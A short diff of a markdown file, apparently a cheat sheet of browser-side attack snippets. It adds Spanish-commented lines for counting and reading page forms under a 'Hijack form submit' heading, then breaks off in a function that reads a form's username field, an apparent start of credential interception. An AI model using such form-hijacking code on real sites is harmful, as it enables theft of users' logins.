@@ -20,6 +20,11 @@ for  (i=0; i<links.length; i++){
 ```
 
 ### 3. Hijack form submit
+> Número de elementos <form> en el documento:  
+```let num = document.forms.length;```  
+> Obtenga la identificación del primer elemento <form>:  
+```let id = document.forms[0].id;```  
+
 ```
 function InterceptForm(){
   var username = document.forms[0].elements[0].value;
